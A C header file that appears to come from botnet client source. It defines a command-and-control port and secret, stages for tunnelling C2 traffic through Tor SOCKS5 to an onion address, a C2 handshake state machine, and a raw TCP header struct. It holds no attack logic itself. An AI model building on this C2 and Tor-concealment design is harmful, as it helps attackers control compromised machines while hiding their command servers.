#pragma once

#define CNC_PORT        31337
#define CNC_SECRET      18456

#define STAGE_SETUP     0 // setup non-blocking connection
#define STAGE_VERIFY    1 // verify if the connection is alive
#define STAGE_TORSOCK   2 // complete connection passover to sock5
#define STAGE_MAINLOOP  3 // main loop with the cnc

#define TOR_AUTH        0 // authenticate to the sock5
#define TOR_HANDOVER    1 // handover the connection to the dest onion/domain
#define TOR_VERIFY      2 // verify if the sock5 has handed over the connection

#define CONN_SENDSEQ    0 // send seq number + chksum to cnc
#define CONN_RECVSEQ    1 // recv seq number + chksum from cnc (round1)
#define CONN_RECVSEQ2   2 // recv seq number + chksum from cnc (round2)
#define CONN_ESTABLISHED 3 // established connection to cnc

struct tcp_hdr
{
    short int src;
    short int des;
    int seq;
    int ack;
    unsigned char tcph_reserved:4, tcph_offset:4;
    short int hdr_flags;
    short int rec;
    int cksum;
    short int ptr;
    int opt;
};
